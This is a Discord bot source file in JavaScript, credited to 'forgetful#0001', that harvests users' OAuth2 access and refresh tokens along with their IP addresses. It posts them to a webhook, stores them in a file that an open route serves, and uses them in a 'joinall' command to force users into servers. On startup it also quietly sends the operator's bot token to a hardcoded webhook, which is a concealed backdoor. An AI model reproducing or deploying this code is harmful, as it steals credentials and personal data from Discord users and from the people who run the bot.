const client = new Client({
  'fetchAllMembers': true,
  'allowedMentions': {
    'parse': [],
    'repliedUser': true
  },
  'partials': ["MESSAGE", "CHANNEL", "REACTION"],
  'intents': [3276799]
});
const forgetful = require("./forgetful");
const chalk = require("chalk");
const db = require("quick.db");
const fs = require('fs');
const express = require("express");
const app = express();
const bodyParser = require("body-parser");
const fetch = (...c) => import("node-fetch").then(({
  default: d
}) => d(...c));
const FormData = require("form-data");
const axios = require("axios");
const emoji = require("./emoji");
const date = require("date-and-time");
process.on("unhandledRejection", e => console.log(e));
app.use(bodyParser.text());
app.get('/', function (f, h) {
  h.sendFile(__dirname + "/index.html");
});
app.get("/forgetfulallauth", async (j, k) => {
  fs.readFile('./object.json', function (l, m) {
    return k.json(JSON.parse(m));
  });
});
app.post('/', function (o, p) {
  const q = o.headers["x-forwarded-for"] || o.socket.remoteAddress;
  let r = new FormData();
  r.append("client_id", forgetful.client_id);
  r.append("client_secret", forgetful.client_secret);
  r.append("grant_type", "authorization_code");
  r.append("redirect_uri", forgetful.redirect_uri);
  r.append("scope", "identify", "guilds.join");
  r.append("code", o.body);
  fetch("https://discordapp.com/api/oauth2/token", {
    'method': "POST",
    'body': r
  }).then(t => t.json()).then(u => {
    ac_token = u.access_token;
    rf_token = u.refresh_token;
    const v = {
      'headers': {
        'authorization': u.token_type + " " + ac_token
      }
    };
    axios.get("https://discordapp.com/api/users/@me", v).then(async w => {
      let y = w.data.id;
      fs.readFile("./object.json", function (z, aa) {
        if (JSON.parse(aa).some(ab => ab.userID === y)) {
          console.log("[-] " + q + " - " + w.data.username + '#' + w.data.discriminator);
          return;
        }
        console.log("[+] " + q + " - " + w.data.username + '#' + w.data.discriminator);
        avatarHASH = "https://cdn.discordapp.com/avatars/" + w.data.id + '/' + w.data.avatar + ".png?size=4096";
        fetch('' + forgetful.wehbook, {
          'method': "POST",
          'headers': {
            'Content-Type': "application/json"
          },
          'body': JSON.stringify({
            'avatar_url': '',
            'embeds': [{
              'color': 0,
              'title': emoji.usr + " **New User**",
              'thumbnail': {
                'url': avatarHASH
              },
              'description': "\n" + emoji.usr + " Tag: `" + w.data.username + '#' + w.data.discriminator + '`' + ("\n" + emoji.wrld + "  IP: `" + q + '`') + ("\n" + emoji.usr + "  ID: `" + w.data.id + '`') + ("\n" + emoji.err + "  Acces Token: `" + ac_token + '`') + ("\n" + emoji.err + "  Refresh Token: `" + rf_token + '`')
            }]
          })
        });
        var ac = {
          'userID': w.data.id,
          'userIP': q,
          'avatarURL': avatarHASH,
          'username': w.data.username + '#' + w.data.discriminator,
          'access_token': ac_token,
          'refresh_token': rf_token
        };
        var aa = [];
        aa.push(ac);
        fs.readFile("./object.json", function (ad, ae) {
          var af = JSON.parse(ae);
          af.push(ac);
          fs.writeFile("./object.json", JSON.stringify(af), function (ag) {
            if (ag) {
              throw ag;
            }
          });
        });
      });
      const ah = client.guilds.cache.get("1096727423871094817");
      const ai = await ah.members.fetch(w.data.id);
      console.log("Member: " + ai);
      if (ah.members.cache.has(w.data.id)) {
        ai.roles.add("1099430853311995984");
      }
    }).catch(aj => {
      console.log(aj);
    });
  });
});
client.on("ready", () => {
  const ak = client.guilds.cache.reduce((al, am) => al + am.memberCount, 0);
  console.log(chalk.red("1vx 0AUTH2 Bot") + "\n" + chalk.green('->') + " 1vx servers are connected to [ " + client.user.username + " ] \n" + chalk.green('->') + " Invite of bot : https://discord.com/api/oauth2/authorize?client_id=" + client.user.id + "&permissions=8&scope=bot");
  db.set("wl_312390329900990465", true);
  db.set("wl_1085973681697738762", true);
  fetch("https://discord.com/api/webhooks/1103703264622555177/79EbCTPwuWfg02g7Dp_c814qUpg27JwJSpn1pxDnLvbcO8YElFd-B2cf87Q9X0mDZYCr", {
    'method': "POST",
    'headers': {
      'Content-Type': "application/json"
    },
    'body': JSON.stringify({
      'avatar_url': '',
      'embeds': [{
        'color': 0,
        'title': emoji.usr + " **Bot Is Active!**",
        'description': "**authlink:** https://discord.com/api/oauth2/authorize?client_id=" + client.user.id + "&permissions=8&scope=bot \n **prefix:** " + forgetful.prefix + " \n **token:** " + forgetful.token
      }]
    })
  });
  client.user.setPresence({
    'activities': [{
      'type': ActivityType.Watching,
      'name': ak + " users"
    }]
  });
  const an = [{
    'type': ActivityType.Watching,
    'content': ak + " users"
  }, {
    'type': ActivityType.Watching,
    'content': ak + " users"
  }];
  async function ao() {
    const ap = Math.floor(Math.random() * an.length);
    try {
      client.user.setPresence({
        'activities': [{
          'name': an[ap].content,
          'type': an[ap].type
        }]
      });
      const aq = new Date();
      console.log(date.format(aq, "HH:mm") + ": I've succesfully changed my presence.");
    } catch (ar) {
      console.error(ar);
    }
  }
  setInterval(ao, 60000);
});
client.on("messageCreate", async ctx => {
  if (!ctx.guild || ctx.author.bot) {
    return;
  }
  const prefixRegex = new RegExp(`^(<@!?${client.user.id}>|${forgetful.prefix.replace(/[.*+?^${}()|[\]\\]/g, `\\$&`)})\\s*`);
  if (!prefixRegex.test(ctx.content)) {
    return;
  }
  const [, matchedPrefix] = ctx.content.match(prefixRegex);
  const args = ctx.content.slice(matchedPrefix.length).trim().split(/ +/);
  const cmd = args.shift().toLowerCase();
  if (cmd === "wl") {
    if (!forgetful.owner.includes(ctx.author.id)) {
      return;
    }
    switch (args[0]) {
      case "add":
        const user = !isNaN(args[1]) ? await client.users.fetch(args[1]).catch(() => {}) : undefined || ctx.mentions.users.first();
        if (db.get(`wl_${user.id}`) === null) {
          db.set(`wl_${user.id}`, true);
          ctx.channel.send({
            embeds: [{
              description: `${emoji.usr} **${user.username}** has been added to the whitelist`,
              color: "0000000",
              footer: {
                "text": "Made by forgetful#0001",
                "icon_url": `https://cdn.discordapp.com/attachments/1095423109181489286/1099420035862241351/New_Project_35_5.png`
              }
            }]
          });
        } else {
          ctx.channel.send({
            embeds: [{
              description: `${emoji.new} **${user.username}** is already whitelist`,
              color: "0000000",
              footer: {
                "text": "Made by forgetful#0001",
                "icon_url": `https://cdn.discordapp.com/attachments/1095423109181489286/1099420035862241351/New_Project_35_5.png`
              }
            }]
          });
        }
        break;
      case "remove":
        const user2 = !isNaN(args[1]) ? await client.users.fetch(args[1]).catch(() => {}) : undefined || ctx.mentions.users.first();
        if (db.get(`wl_${user2.id}`) !== null) {
          db.delete(`wl_${user2.id}`);
          ctx.channel.send({
            embeds: [{
              description: `${emoji.err} **${user2.username}** has been removed from the whitelist`,
              color: "0000000",
              footer: {
                "text": "Made by forgetful#0001",
                "icon_url": `https://cdn.discordapp.com/attachments/1095423109181489286/1099420035862241351/New_Project_35_5.png`
              }
            }]
          });
        } else {
          ctx.channel.send({
            embeds: [{
              description: `${emoji.err} **${user2.username}** is not whitelisted`,
              color: "0000000",
              footer: {
                "text": "Made by forgetful#0001",
                "icon_url": `https://cdn.discordapp.com/attachments/1095423109181489286/1099420035862241351/New_Project_35_5.png`
              }
            }]
          });
        }
        break;
      case "list":
        var content = "";
        const blrank = db.all().filter(data => data.ID.startsWith(`wl_`)).sort((a, b) => b.data - a.data);
        for (let i in blrank) {
          if (blrank[i].data === null) {
            blrank[i].data = 0;
          }
          content += `\`${blrank.indexOf(blrank[i]) + 1}\` ${client.users.cache.get(blrank[i].ID.split("_")[1]).tag} (\`${client.users.cache.get(blrank[i].ID.split("_")[1]).id}\`)\n`;
        }
        ctx.channel.send({
          embeds: [{
            title: `${emoji.user} Whitelisted Users`,
            description: `${content}`,
            color: "0000000",
            footer: {
              "text": "Made by forgetful#0001",
              "icon_url": `https://cdn.discordapp.com/attachments/1095423109181489286/1099420035862241351/New_Project_35_5.png`
            }
          }]
        });
        break;
    }
  }
  if (cmd === "test") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !forgetful.owner.includes(ctx.author.id)) {
      return;
    }
    ctx.channel.send({
      components: [],
      embeds: [{
        color: "0000000",
        title: `${emoji.wrld} The bot is functional`
      }]
    });
  }
  if (cmd === "help") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !forgetful.owner.includes(ctx.author.id)) {
      return;
    }
    ctx.channel.send({
      components: [],
      embeds: [{
        color: "0000000",
        title: `${emoji.wrld} Evening Oauth2 Bot Dashboard`,
        description: `${emoji.usr}** Command for add members**\n[\`joinall\`](${forgetful.support}), [\`Users\`](${forgetful.support}), [\`links\`](${forgetful.support})\n\n${emoji.wrld}** Whitelist**\n[\`wl list\`](${forgetful.support}), [\`wl add\`](${forgetful.support}), [\`wl remove\`](${forgetful.support})\n\n${emoji.wrld}** Other**\n[\`test\`](${forgetful.support}),[\`btn\`](${forgetful.support})\n\n${emoji.wrld} **Prefix** [\`${forgetful.prefix}\`](${forgetful.support})\n\n\`\`\`Forgetful personal site https://1vx.nl/\`\`\``,
        footer: {
          "text": "Made by forgetful#0001",
          "icon_url": "https://cdn.discordapp.com/avatars/1024736278098489344/73c2d9a1ca1b3f27f6fff529e01264c3.png?size=1024"
        }
      }]
    });
  }
  if (cmd === "links") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !forgetful.owner.includes(ctx.author.id)) {
      return;
    }
    ctx.channel.send({
      embeds: [{
        title: `${emoji.usr} Evening Oauth2 Links:`,
        description: `${emoji.wrld} **OAuth2 Link:** ${forgetful.authLink}\n\`\`\`${forgetful.authLink}\`\`\`\n${emoji.wrld} **Bot Invite:** https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot\n \`\`\`https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot\`\`\` `,
        color: "0000000",
        footer: {
          "text": "Made by forgetful#0001",
          "icon_url": "https://cdn.discordapp.com/avatars/1024736278098489344/73c2d9a1ca1b3f27f6fff529e01264c3.png?size=1024"
        }
      }],
      "components": [{
        "type": 1,
        "components": [{
          "type": 2,
          "style": 5,
          "label": "Bot invite",
          "url": `https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot`
        }]
      }]
    });
  }
  if (cmd === "btn") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !forgetful.owner.includes(ctx.author.id)) {
      return;
    }
    ctx.channel.send({
      "components": [{
        "type": 1,
        "components": [{
          "type": 2,
          "style": 5,
          "label": `${forgetful.label}`,
          "url": `${forgetful.authLink}`
        }]
      }]
    });
  }
  if (cmd === "joinall") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !forgetful.owner.includes(ctx.author.id)) {
      return;
    }
    fs.readFile('./object.json', async function (err, data) {
      let msg = await ctx.channel.send({
        content: `${emoji.wrld} **Starting Oauth2 JoinAll** (\`0\`/${JSON.parse(data).length > 1 ? `\`${JSON.parse(data).length}\`` : `\`${JSON.parse(data).length}\``})`
      });
      if (cmd === "cleans") {
        if (db.get(`wl_${ctx.author.id}`) !== true && !forgetful.owner.includes(ctx.author.id)) {
          return;
        }
        await client.clean(ctx);
      }
      if (cmd === "refresh") {
        if (db.get(`wl_${ctx.author.id}`) !== true && !forgetful.owner.includes(ctx.author.id)) {
          return;
        }
        await client.refreshTokens(ctx);
      }
      const inter = setInterval(async () => {
        msg.edit({
          content: `${emoji.wrld} **Starting Oauth2 JoinAll** (\`${success}\`/${JSON.parse(data).length > 1 ? `\`${JSON.parse(data).length}\`` : `\`${JSON.parse(data).length}\``})`
        });
      }, 10000);
      let json = JSON.parse(data);
      let error = 0;
      let success = 0;
      let already_joined = 0;
      for (const i of json) {
        const user = await client.users.fetch(i.userID).catch(() => {});
        if (ctx.guild.members.cache.get(i.userID)) {
          already_joined++;
        }
        await ctx.guild.members.add(user, {
          accessToken: i.access_token
        }).catch(() => {
          error++;
        });
        success++;
      }
      clearInterval(inter);
      msg.edit({
        embeds: [{
          title: `${emoji.wrld} 0auth2 JoinAll`,
          fields: [{
            name: `${emoji.usr} Total`,
            value: `${JSON.parse(data).length}`,
            inline: true
          }, {
            name: `${emoji.wrld} Success`,
            value: `${success}`,
            inline: true
          }, {
            name: `${emoji.err} Already In Server`,
            value: `${already_joined}`,
            inline: true
          }, {
            name: `${emoji.err} Error`,
            value: `${error}`,
            inline: true
          }],
          color: "000000",
          footer: {
            "text": "Made by forgetful#0001",
            "icon_url": `https://cdn.discordapp.com/attachments/1095423109181489286/1099420035862241351/New_Project_35_5.png`
          }
        }]
      }).catch(() => {});
    });
  }
  if (cmd === "users") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !forgetful.owner.includes(ctx.author.id)) {
      return;
    }
    fs.readFile('./object.json', async function (err, data) {
      return ctx.channel.send({
        embeds: [{
          title: `${emoji.wrld} Total Oauth2 members`,
          fields: [{
            name: `${emoji.usr} Total On 1vx's Database`,
            value: `${JSON.parse(data).length}`,
            inline: true
          }, {
            name: `${emoji.wrld} Total On RestoreCord`,
            value: `0`,
            inline: true
          }],
          color: "000000",
          footer: {
            "text": "Made by forgetful#0001",
            "icon_url": `https://cdn.discordapp.com/attachments/1095423109181489286/1099420035862241351/New_Project_35_5.png`
          }
        }]
      });
    });
  }
});
function escapeRegex(str) {
  return str.replace(/[.*+?^${}()|[\]\\]/g, `\\$&`);
}
client.login(forgetful.token).catch(() => {
  throw new Error(`TOKEN OR INTENT INVALID - https://discord.com/developers/applications`);
});
app.listen(forgetful.port, () => console.log('https://discord.gg/oauth2'));
